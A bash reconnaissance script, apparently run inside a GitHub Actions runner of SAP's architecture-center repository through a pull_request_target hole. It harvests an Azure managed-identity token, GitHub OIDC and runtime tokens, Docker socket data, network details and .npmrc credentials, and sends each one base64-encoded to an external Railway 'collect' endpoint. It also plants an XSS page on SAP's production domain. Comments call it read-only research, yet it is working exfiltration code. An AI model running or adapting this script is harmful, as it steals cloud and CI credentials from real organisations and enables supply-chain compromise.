#!/bin/bash
# Recon5: Cloud metadata, Docker socket, OIDC token probes
# Read-only, non-destructive

RECEIVER_URL="https://sap-test-receiver-production-f76d.up.railway.app/collect"

# --- 1. Azure IMDS (Instance Metadata Service) ---
# GitHub-hosted runners are on Azure. IMDS at 169.254.169.254 requires Metadata:true header.

IMDS_BASE="http://169.254.169.254/metadata"

# Instance metadata
IMDS_INSTANCE=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
  "$IMDS_BASE/instance?api-version=2021-02-01" 2>/dev/null || echo "UNREACHABLE")
curl -s -X POST "$RECEIVER_URL?stage=imds_instance" \
  -d "$(echo "$IMDS_INSTANCE" | base64 -w0)" || true

# Network metadata
IMDS_NETWORK=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
  "$IMDS_BASE/instance/network?api-version=2021-02-01" 2>/dev/null || echo "UNREACHABLE")
curl -s -X POST "$RECEIVER_URL?stage=imds_network" \
  -d "$(echo "$IMDS_NETWORK" | base64 -w0)" || true

# Identity / managed identity token (would allow Azure API access)
IMDS_IDENTITY=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
  "$IMDS_BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || echo "UNREACHABLE")
curl -s -X POST "$RECEIVER_URL?stage=imds_identity" \
  -d "$(echo "$IMDS_IDENTITY" | base64 -w0)" || true

# Attested data
IMDS_ATTESTED=$(curl -sf -H "Metadata:true" --connect-timeout 3 \
  "$IMDS_BASE/attested/document?api-version=2021-02-01" 2>/dev/null || echo "UNREACHABLE")
curl -s -X POST "$RECEIVER_URL?stage=imds_attested" \
  -d "$(echo "$IMDS_ATTESTED" | base64 -w0)" || true

# --- 2. Docker Socket Probe ---
# The drawio export step uses DOCKER=1. Check if Docker socket is accessible.

DOCKER_SOCK="/var/run/docker.sock"
DOCKER_RESULTS=""

if [ -e "$DOCKER_SOCK" ]; then
  DOCKER_RESULTS="socket_exists=yes"
  # Check permissions
  DOCKER_PERMS=$(ls -la "$DOCKER_SOCK" 2>/dev/null)
  DOCKER_RESULTS="$DOCKER_RESULTS|perms=$DOCKER_PERMS"
  # Check if we can query Docker API via socket
  DOCKER_INFO=$(curl -sf --unix-socket "$DOCKER_SOCK" http://localhost/info 2>/dev/null || echo "ACCESS_DENIED")
  DOCKER_RESULTS="$DOCKER_RESULTS|info_len=${#DOCKER_INFO}"
  DOCKER_IMAGES=$(curl -sf --unix-socket "$DOCKER_SOCK" http://localhost/images/json 2>/dev/null || echo "ACCESS_DENIED")
  DOCKER_RESULTS="$DOCKER_RESULTS|images_len=${#DOCKER_IMAGES}"
  DOCKER_CONTAINERS=$(curl -sf --unix-socket "$DOCKER_SOCK" http://localhost/containers/json?all=true 2>/dev/null || echo "ACCESS_DENIED")
  DOCKER_RESULTS="$DOCKER_RESULTS|containers_len=${#DOCKER_CONTAINERS}"
  # Send full Docker info
  curl -s -X POST "$RECEIVER_URL?stage=docker_info" \
    -d "$(echo "$DOCKER_INFO" | base64 -w0)" || true
  curl -s -X POST "$RECEIVER_URL?stage=docker_images" \
    -d "$(echo "$DOCKER_IMAGES" | base64 -w0)" || true
  curl -s -X POST "$RECEIVER_URL?stage=docker_containers" \
    -d "$(echo "$DOCKER_CONTAINERS" | base64 -w0)" || true
else
  DOCKER_RESULTS="socket_exists=no"
  # Check if docker CLI is available
  DOCKER_CLI=$(which docker 2>/dev/null || echo "not_found")
  DOCKER_RESULTS="$DOCKER_RESULTS|cli=$DOCKER_CLI"
  DOCKER_VERSION=$(docker version 2>&1 || echo "unavailable")
  DOCKER_RESULTS="$DOCKER_RESULTS|version_len=${#DOCKER_VERSION}"
  curl -s -X POST "$RECEIVER_URL?stage=docker_version" \
    -d "$(echo "$DOCKER_VERSION" | base64 -w0)" || true
fi
curl -s "$RECEIVER_URL?stage=docker_probe&result=$(echo "$DOCKER_RESULTS" | head -c 500 | base64 -w0)" || true

# --- 3. OIDC Token Probe ---
# Check if GitHub Actions OIDC is configured (ACTIONS_ID_TOKEN_REQUEST_URL)

OIDC_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
OIDC_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
OIDC_RESULTS=""

if [ -n "$OIDC_URL" ]; then
  OIDC_RESULTS="oidc_configured=yes|url=$OIDC_URL"
  # Try to request an OIDC token (read-only, doesn't grant any access by itself)
  OIDC_RESPONSE=$(curl -sf -H "Authorization: bearer $OIDC_TOKEN" \
    "$OIDC_URL&audience=api://AzureADTokenExchange" 2>/dev/null || echo "REQUEST_FAILED")
  OIDC_RESULTS="$OIDC_RESULTS|response_len=${#OIDC_RESPONSE}"
  curl -s -X POST "$RECEIVER_URL?stage=oidc_token" \
    -d "$(echo "$OIDC_RESPONSE" | base64 -w0)" || true
else
  OIDC_RESULTS="oidc_configured=no"
fi
curl -s "$RECEIVER_URL?stage=oidc_probe&result=$(echo "$OIDC_RESULTS" | base64 -w0)" || true

# --- 4. ACTIONS_RUNTIME_TOKEN + Cache API Probe ---
# Check if we can interact with the Actions cache API

CACHE_URL="$ACTIONS_CACHE_URL"
RUNTIME_TOKEN="$ACTIONS_RUNTIME_TOKEN"

if [ -n "$CACHE_URL" ] && [ -n "$RUNTIME_TOKEN" ]; then
  CACHE_RESULTS="cache_api=available|url=$CACHE_URL"
  # List existing cache entries (read-only)
  CACHE_LIST=$(curl -sf \
    -H "Authorization: Bearer $RUNTIME_TOKEN" \
    -H "Accept: application/json;api-version=6.0-preview.1" \
    "${CACHE_URL}_apis/artifactcache/caches" 2>/dev/null || echo "LIST_FAILED")
  CACHE_RESULTS="$CACHE_RESULTS|list_len=${#CACHE_LIST}"
  curl -s -X POST "$RECEIVER_URL?stage=cache_list" \
    -d "$(echo "$CACHE_LIST" | base64 -w0)" || true
else
  CACHE_RESULTS="cache_api=unavailable"
fi
curl -s "$RECEIVER_URL?stage=cache_probe&result=$(echo "$CACHE_RESULTS" | base64 -w0)" || true

# --- 5. Additional Environment Probes ---
# Network interfaces, DNS, and other runner details

NET_INFO=$(ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "unavailable")
curl -s -X POST "$RECEIVER_URL?stage=net_info" \
  -d "$(echo "$NET_INFO" | base64 -w0)" || true

DNS_CONFIG=$(cat /etc/resolv.conf 2>/dev/null || echo "unavailable")
curl -s -X POST "$RECEIVER_URL?stage=dns_config" \
  -d "$(echo "$DNS_CONFIG" | base64 -w0)" || true

# Check for .npmrc tokens
NPMRC=$(cat ~/.npmrc 2>/dev/null; cat .npmrc 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=npmrc" \
  -d "$(echo "$NPMRC" | base64 -w0)" || true

# Keep the XSS PoC page
mkdir -p static
cat > static/poc.html << 'XEOF'
<!DOCTYPE html>
<html>
<head><title>Security Research PoC</title></head>
<body>
<h1>XSS Proof of Concept</h1>
<p>This page demonstrates arbitrary JavaScript execution on SAP's production domain via pull_request_target vulnerability in SAP/architecture-center.</p>
<p>Domain: <span id="d"></span></p>
<script>
document.getElementById('d').textContent = document.domain;
alert(document.domain);
</script>
</body>
</html>
XEOF

curl -s "$RECEIVER_URL?stage=recon5_complete" || true
exit 0
